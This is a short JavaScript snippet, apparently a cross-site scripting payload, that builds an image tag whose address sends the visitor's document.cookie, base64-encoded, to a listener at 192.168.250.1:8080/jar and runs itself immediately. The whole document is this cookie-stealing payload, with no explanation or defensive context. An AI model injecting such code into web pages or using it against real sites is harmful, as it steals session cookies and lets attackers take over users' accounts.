function addImage() {
    var img = document.createElement('img');
    img.src = "http://192.168.250.1:8080/jar?cookie="+btoa(document.cookie);
    document.body.appendChild(img);
}

addImage();
